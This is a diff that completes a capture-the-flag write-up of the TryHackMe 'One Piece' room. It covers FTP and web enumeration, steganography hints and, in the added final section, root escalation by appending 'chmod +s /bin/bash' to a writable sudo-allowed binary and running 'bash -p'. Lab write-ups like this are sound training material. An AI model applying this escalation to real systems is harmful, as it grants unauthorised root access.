@@ -1,4 +1,4 @@
-<img width="1125" height="648" alt="image" src="https://github.com/user-attachments/assets/d820bd6b-33de-4955-b07a-72f2b0d8a910" /># **One Piece - TryHackMe**
+# **One Piece - TryHackMe**
 
 *Target Ip. Address: 10.49.130.3*
 
@@ -60,8 +60,10 @@ We are in. Let's see the files, directories we get from ftp.
 
 ```bash
 ftp> ls -la
-229 Entering Extended Passive Mode (|||59076|)                                                                                                     
-150 Here comes the directory listing.                                                                                                              
+229 Entering Extended Passive Mode (|||59076|)
+                                                 
+150 Here comes the directory listing.
+                                                   
 drwxr-xr-x    3 0        0            4096 Jul 26  2020 .
 drwxr-xr-x    3 0        0            4096 Jul 26  2020 ..
 drwxr-xr-x    2 0        0            4096 Jul 26  2020 .the_whale_tree
@@ -84,7 +86,8 @@ drwxr-xr-x    3 0        0            4096 Jul 26  2020 ..
 2 more hidden files, download all the files to the attacker machine.
 
 ```bash
-kali@kali;cat secret_room.txt                                                                                                                            
+kali@kali;cat secret_room.txt
+                                                         
 Inuarashi: You reached the center of the Whale, the majestic tree of Zou.
 Nekomamushi: We have hidden this place for centuries.
 Inuarashi: Indeed, it holds a secret.
@@ -111,7 +114,7 @@ wrote extracted data to "road_poneglyphe1.txt".
 We extracted first hint wihtout passphrase.
 
 ```bash
-kali@kali:cat road_poneglyphe1.txt                                                                                                                       
+kali@kali:cat road_poneglyphe1.txt                                                         
 FUWS2LJNEAWS2LJ......FUWS2IBNFUWS2LIK
 ```
 
@@ -143,9 +146,12 @@ After a bit of googling around, I found a repository called LogPose, and the own
 It tells that it will lead us to another island, and we have a wordlist. The wordlists looks like a directory list, let's use gobuster.
 
 ```bash
-kali@kali:gobuster dir -u http://10.49.130.3 -w LogPose.txt -x php,html,txt                                                                          
-===============================================================                                                                                   
-Gobuster v3.8.2                                                                                                                                   
+kali@kali:gobuster dir -u http://10.49.130.3 -w LogPose.txt -x php,html,txt
+                                                     
+===============================================================
+                                                  
+Gobuster v3.8.2
+                                                  
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 [+] Url:                     http://10.49.130.3
@@ -201,7 +207,8 @@ We actually find next hint in the css file.
 Let's download that image and see what we can do with it.
 
 ```bash
-kali@kali:steghide --extract -sf other_hint.jpg                                                                                                         
+kali@kali:steghide --extract -sf other_hint.jpg
+                                                        
 Enter passphrase: 
 steghide: could not extract any data with that passphrase!
 ```
@@ -209,7 +216,8 @@ steghide: could not extract any data with that passphrase!
 Empty passphrase fails here.
 
 ```bash
-kali@kali:exiftool other_hint.jpg                                                                                                                       
+kali@kali:exiftool other_hint.jpg
+                                                        
 ExifTool Version Number         : 13.44
 File Name                       : other_hint.jpg
 Directory                       : .
@@ -239,12 +247,14 @@ Megapixels                      : 0.305
 We find another hint (url) in the image metadata, let's download that.
 
 ```bash
-kali@kali:steghide --extract -sf other_hint2.jpg                                                                                                        
+kali@kali:steghide --extract -sf other_hint2.jpg
+                                                        
 Enter passphrase: 
 steghide: could not extract any data with that passphrase!
 ```
 ```bash
-kali@kali:exiftool other_hint2.jpg                                                                                                                      
+kali@kali:exiftool other_hint2.jpg
+                                                        
 ExifTool Version Number         : 13.44
 File Name                       : other_hint2.jpg
 Directory                       : .
@@ -273,7 +283,8 @@ Megapixels                      : 0.922
 Nothing from steghide and exiftool, let's try strings.
 
 ```bash
-kali@kali:strings other_hint2.jpg                                                                                                                       
+kali@kali:strings other_hint2.jpg
+                                                        
 JFIF
 2BQa#Rbqr
 &5Ts
@@ -319,7 +330,7 @@ The hint tells us she likes cakes. In cookie section, we see that it is set to '
 That was successful, we got 2nd road poneglyph and a hint for next endpoint.
 
 ```bash
-kali@kali: cat road_poneglyph2.txt                                                                                                                       
+kali@kali: cat road_poneglyph2.txt                                                         
 FUWS2LJNEAWS2LJNFUQC4LJNF.....NFUWSALJNFUWS2IBNFUWS2LJA
 ```
 
@@ -395,7 +406,8 @@ StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 That worked. Let's what it have for us.
 
 ```bash
-kali@kali:cat kaido.jpeg.out                                                                                                                            
+kali@kali:cat kaido.jpeg.out
+                                                        
 Username:K1...ts
 ```
 
@@ -423,7 +435,7 @@ Well, that took forever but worked. Should have increased the tasks.
 We get third road poneglyph, but no further hints from here.
 
 ```bash
-kali@kali: cat road_poneglyph3.txt                                                                                                                       
+kali@kali: cat road_poneglyph3.txt                                                         
 FYWS2LJNEAXC2LJNFUFC2L.....JNFUWS2IBOFUWS2LIK
 ```
 
@@ -434,7 +446,7 @@ You succeed to run away and there is only one Road Poneglyph left to find to be 
 The hint is in there only. It is in /unspecified. We find the last road poneglyph.
 
 ```bash
-kali@kali:cat road_poneglyph4.txt                                                                                                                       
+kali@kali:cat road_poneglyph4.txt                                                        
 FUWS2LJNEAWS2LJNFUQC4LJNF.....NFUWSALRNFUWS2IBOFUWS2LI=
 ```
 
@@ -577,15 +589,94 @@ User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
 
 We can run '/usr/local/bin/less' as root. Quick look on "*https://gtfobins.org/gtfobins/less/*", we have privilege escalation for it.
 
+```bash
+7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less /etc/hosts
+Sorry, I can't tell you where is the One Piece
+```
 
+This was not expected. This binary isnot standard less.
 
+```bash
+7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less
+Sorry, I can't tell you where is the One Piece
+```
 
-To be continued.....
+This binary is just made to reply that string only. 
 
+```bash
+7uffy_vs_T3@ch@Laugh-Tale:~$ ls -la /usr/local/bin/less                   
+-rwxrwx-wx 1 root root 67 Aug 14  2020 /usr/local/bin/less
+```
 
+And, we have write access to it. Aparrently, we can write any command to it, using sudo root will execute that.
 
+```bash
+7uffy_vs_T3@ch@Laugh-Tale:~$ echo "chmod +s /bin/bash" >> /usr/local/bin/less
+```
 
+We will make /bin/bash SUID to become root.
 
+```bash
+7uffy_vs_T3@ch@Laugh-Tale:~$ sudo /usr/local/bin/less
+```
 
+Now, since we have used sudo on that binary, our command should execute and make /bin/bash a SUID.
 
+```bash
+7uffy_vs_T3@ch@Laugh-Tale:~$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
+```
 
+That was successfull, now we can become root.
+
+```bash
+7uffy_vs_T3@ch@Laugh-Tale:~$ /bin/bash -p
+bash-4.4# id
+uid=1000(7uffy_vs_T3@ch) gid=1000(teach) euid=0(root) egid=0(root) groups=0(root),1000(teach)
+```
+
+Now, we can read the final flag/hint at root directory and end this incredible journey of becoming the King of Pirates.
+
+```bash
+bash-4.4# ls -la
+total 36
+drwx------  5 root root 4096 Jul 29  2020 .
+drwxr-xr-x 24 root root 4096 Jul 29  2020 ..
+-rw-------  1 root root  217 Aug 14  2020 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Feb  3  2020 .cache
+drwx------  3 root root 4096 Jul 26  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Jul 26  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-------  1 root root    0 Jul 26  2020 .python_history
+-rw-r--r--  1 root root  172 Jul 29  2020 .wget-hsts
+```
+
+Wait !!! Where is the flag/hint ???
+
+```bash
+bash-4.4# grep -iRl "One Piece" /home /root /usr 2>/dev/null
+/home/teach/luffy_vs_teach.txt
+/home/luffy/laugh_tale.txt
+/usr/src/linux-hwe-5.4-headers-5.4.0-42/include/linux/scatterlist.h
+/usr/src/linux-hwe-5.4-headers-5.4.0-42/arch/mips/include/asm/octeon/cvmx-pow.h
+/usr/src/linux-hwe-5.4-headers-5.4.0-42/mm/Kconfig
+/usr/src/linux-headers-4.15.0-041500/include/linux/scatterlist.h
+/usr/src/linux-headers-4.15.0-041500/arch/mips/include/asm/octeon/cvmx-pow.h
+/usr/src/linux-headers-4.15.0-041500/mm/Kconfig
+/usr/src/linux-headers-4.15.0-041500-generic/include/linux/scatterlist.h
+/usr/src/linux-headers-4.15.0-041500-generic/arch/mips/include/asm/octeon/cvmx-pow.h
+/usr/src/linux-headers-4.15.0-041500-generic/mm/Kconfig
+/usr/bin/gomugomunooo_king_kobraaa
+/usr/share/perl/5.26.1/Archive/Tar.pm
+/usr/share/perl/5.26/Archive/Tar.pm
+/usr/share/libreoffice/help/en-US/scalc.jar
+/usr/.../.../......
+```
+
+We found the flag/hint. Finally, we can read it and end this challenge.
+
+```bash
+bash-4.4# cat /usr/.../.../......
+One Piece: S.....t$
+```
